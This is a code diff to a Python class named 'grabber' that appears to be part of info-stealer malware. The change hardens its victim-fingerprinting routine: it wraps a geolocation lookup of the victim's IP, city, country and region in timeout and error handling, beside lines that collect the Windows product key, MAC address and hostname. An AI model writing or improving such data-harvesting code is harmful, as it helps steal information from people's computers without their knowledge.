@@ -449,11 +449,14 @@ class grabber:
                     except Exception:
                         pass
 
-                    data = requests.get("https://ipinfo.io/json").json()
-                    ip = data['ip']
-                    city = data['city']
-                    country = data['country']
-                    region = data['region']
+                    try:
+                        data = requests.get("https://ipinfo.io/json", timeout=5).json()
+                        ip = data.get('ip', 'N/A')
+                        city = data.get('city', 'N/A')
+                        country = data.get('country', 'N/A')
+                        region = data.get('region', 'N/A')
+                    except Exception:
+                        ip = city = country = region = 'N/A'
                     wname, wkey = self.getProductKey()
                     mac = gma()
                     hostname = socket.gethostname()
